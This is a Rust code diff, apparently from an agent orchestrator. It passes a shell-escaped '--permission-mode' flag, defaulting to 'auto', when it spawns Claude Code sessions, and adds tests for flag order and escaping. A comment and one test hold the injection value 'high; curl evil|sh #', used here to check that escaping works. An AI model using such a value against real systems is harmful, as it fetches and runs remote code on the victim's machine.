@@ -54,7 +54,19 @@ fn window_exists_for_terminal(title: &str, terminal: &super::emulator::TerminalE
 
 /// Build the `claude` invocation string shared by all native spawn sites.
 ///
-/// Produces `"{claude_path} --model {model} --effort {effort} {escaped_prompt}[ --remote-control]"`.
+/// Produces `"{claude_path} --model {model} --effort {effort} --permission-mode
+/// {permission_mode} {escaped_prompt}[ --remote-control]"`.
+///
+/// `--permission-mode` is passed on the CLI rather than left to
+/// `permissions.defaultMode` in the worktree's `settings.local.json`, because
+/// Claude Code v2.1.142+ deliberately IGNORES `defaultMode: "auto"` from
+/// project/local settings files (a repo must not be able to grant itself auto
+/// mode). Only the `--permission-mode` startup flag (or user/managed settings)
+/// is honored, so loom stages configured for `auto` would otherwise silently
+/// fall back to `default` and prompt for every action — defeating autonomous
+/// execution. The value is the camelCase spelling Claude Code's
+/// `--permission-mode` flag accepts (`auto`, `acceptEdits`, `plan`, `default`).
+///
 /// The `--remote-control` flag is appended only when `remote_control_enabled`
 /// is true — `claude --remote-control` exits non-zero when its prerequisites
 /// are unmet, so it must never be passed unconditionally.
@@ -64,27 +76,32 @@ fn window_exists_for_terminal(title: &str, terminal: &super::emulator::TerminalE
 /// prompt as the RC session name and claude starts with no initial prompt
 /// (the session sits idle / "stuck").
 ///
-/// `claude_path`, `model`, and `effort` are passed RAW and shell-escaped here.
-/// This is a command-construction trust boundary: model strings containing
-/// shell metacharacters would otherwise be glob-expanded by the shell, and a tampered effort such
-/// as `high; curl evil|sh #` would be command injection. `escaped_prompt` is
-/// pre-escaped by the caller (it is built from a trusted signal path).
+/// `claude_path`, `model`, `effort`, and `permission_mode` are passed RAW and
+/// shell-escaped here. This is a command-construction trust boundary: model
+/// strings containing shell metacharacters would otherwise be glob-expanded by
+/// the shell, and a tampered effort such as `high; curl evil|sh #` would be
+/// command injection. `escaped_prompt` is pre-escaped by the caller (it is
+/// built from a trusted signal path).
 fn build_claude_command(
     claude_path: &str,
     model: &str,
     effort: &str,
+    permission_mode: &str,
     remote_control_enabled: bool,
     escaped_prompt: &str,
 ) -> String {
     let claude_path = escape(Cow::Borrowed(claude_path));
     let model = escape(Cow::Borrowed(model));
     let effort = escape(Cow::Borrowed(effort));
+    let permission_mode = escape(Cow::Borrowed(permission_mode));
     let remote_control_flag = if remote_control_enabled {
         " --remote-control"
     } else {
         ""
     };
-    format!("{claude_path} --model {model} --effort {effort} {escaped_prompt}{remote_control_flag}")
+    format!(
+        "{claude_path} --model {model} --effort {effort} --permission-mode {permission_mode} {escaped_prompt}{remote_control_flag}"
+    )
 }
 
 /// Native terminal backend - spawns sessions in native terminal windows
@@ -290,14 +307,34 @@ impl NativeBackend {
             }
         };
 
+        // Resolve the Claude Code permission mode and pass it on the CLI. Loom
+        // stages run autonomously with no human at the terminal, so they must
+        // START in the resolved mode (default: `auto`). Writing
+        // `permissions.defaultMode` into the worktree's settings.local.json is
+        // NOT sufficient: Claude Code v2.1.142+ ignores `defaultMode: "auto"`
+        // from project/local settings files, so only `--permission-mode` is
+        // honored (see build_claude_command). Resolved from the same
+        // `[plan_sandbox]` snapshot the settings generator reads
+        // (OrchestratorConfig.sandbox_config is loaded from it too), so the CLI
+        // flag and the generated settings file never disagree.
+        let permission_mode = {
+            let plan_sandbox = crate::fs::work_dir::read_plan_sandbox(&self.work_dir)
+                .ok()
+                .flatten()
+                .unwrap_or_default();
+            crate::sandbox::merge_config(&plan_sandbox, &stage.sandbox, stage.stage_type)
+                .permission_mode
+        };
+
         // Find claude's absolute path (needed for macOS where terminals don't inherit PATH).
-        // build_claude_command shell-escapes the path, model, and effort (S-3).
+        // build_claude_command shell-escapes the path, model, effort, and mode (S-3).
         let claude_path = find_claude_path()?;
         let remote_control_enabled = crate::remote_control::resolve(&self.work_dir);
         let claude_cmd = build_claude_command(
             &claude_path.display().to_string(),
             model,
             effort,
+            permission_mode.as_settings_value(),
             remote_control_enabled,
             &escaped_prompt,
         );
@@ -559,25 +596,64 @@ mod tests {
 
     #[test]
     fn build_claude_command_omits_remote_control_when_disabled() {
-        let cmd = build_claude_command("/usr/bin/claude", "opus", "xhigh", false, "'prompt'");
-        assert_eq!(cmd, "/usr/bin/claude --model opus --effort xhigh 'prompt'");
+        let cmd = build_claude_command(
+            "/usr/bin/claude",
+            "opus",
+            "xhigh",
+            "auto",
+            false,
+            "'prompt'",
+        );
+        assert_eq!(
+            cmd,
+            "/usr/bin/claude --model opus --effort xhigh --permission-mode auto 'prompt'"
+        );
         assert!(!cmd.contains("--remote-control"));
     }
 
     #[test]
     fn build_claude_command_appends_remote_control_when_enabled() {
-        let cmd = build_claude_command("/usr/bin/claude", "sonnet", "high", true, "'prompt'");
-        // `sonnet`/`high`/`/usr/bin/claude` contain only shell-safe chars, so
-        // escaping leaves them unquoted.
+        let cmd = build_claude_command(
+            "/usr/bin/claude",
+            "sonnet",
+            "high",
+            "auto",
+            true,
+            "'prompt'",
+        );
+        // `sonnet`/`high`/`auto`/`/usr/bin/claude` contain only shell-safe
+        // chars, so escaping leaves them unquoted.
         assert_eq!(
             cmd,
-            "/usr/bin/claude --model sonnet --effort high 'prompt' --remote-control"
+            "/usr/bin/claude --model sonnet --effort high --permission-mode auto 'prompt' --remote-control"
         );
         // The flag must sit AFTER the prompt positional, otherwise
         // `--remote-control [name]` swallows the prompt as its optional arg.
         let rc_idx = cmd.find("--remote-control").unwrap();
         let prompt_idx = cmd.find("'prompt'").unwrap();
         assert!(prompt_idx < rc_idx);
+    }
+
+    #[test]
+    fn build_claude_command_passes_permission_mode_before_prompt() {
+        // The resolved permission mode is passed on the CLI (not left to
+        // settings.local.json, which Claude Code ignores for `auto`). Like the
+        // other option flags it must precede the positional prompt.
+        let cmd = build_claude_command(
+            "/usr/bin/claude",
+            "opus",
+            "xhigh",
+            "acceptEdits",
+            false,
+            "'prompt'",
+        );
+        assert!(cmd.contains("--permission-mode acceptEdits"));
+        let mode_idx = cmd.find("--permission-mode").unwrap();
+        let prompt_idx = cmd.find("'prompt'").unwrap();
+        assert!(
+            mode_idx < prompt_idx,
+            "--permission-mode must precede the prompt positional"
+        );
     }
 
     #[test]
@@ -588,6 +664,7 @@ mod tests {
             "/usr/bin/claude",
             "sonnet",
             "high; curl evil|sh #",
+            "auto",
             false,
             "'prompt'",
         );
@@ -600,7 +677,14 @@ mod tests {
     fn build_claude_command_escapes_claude_path_with_spaces() {
         // S-3: a claude path containing spaces must be quoted so the wrapper's
         // `exec` doesn't split it into multiple words.
-        let cmd = build_claude_command("/opt/My Tools/claude", "sonnet", "high", false, "'prompt'");
+        let cmd = build_claude_command(
+            "/opt/My Tools/claude",
+            "sonnet",
+            "high",
+            "auto",
+            false,
+            "'prompt'",
+        );
         assert!(cmd.starts_with("'/opt/My Tools/claude' --model sonnet"));
     }
 }
